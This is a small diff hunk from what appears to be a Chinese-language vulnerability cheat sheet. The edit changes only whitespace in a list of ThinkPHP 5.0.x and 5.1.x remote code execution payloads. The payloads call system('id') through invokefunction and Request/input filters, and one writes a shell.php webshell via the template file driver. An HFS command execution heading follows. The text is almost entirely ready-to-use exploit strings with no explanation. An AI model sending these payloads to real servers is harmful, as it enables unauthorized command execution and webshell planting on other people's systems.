@@ -74,11 +74,11 @@ thinkphp5 测漏洞:
     
     5.0.x版本
 
-    s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1                            s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+    s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1                                             s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
 
     5.1.x版本
 
-    s=index/\think\Request/input&filter=phpinfo&data=1 s=index/\think\Request/input&filter=system&data=id s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+    s=index/\think\Request/input&filter=phpinfo&data=1 s=index/\think\Request/input&filter=system&data=id                                   s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E                                           s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E                                                                 s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1                                       s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
 
 hfs 命令执行漏洞:
 
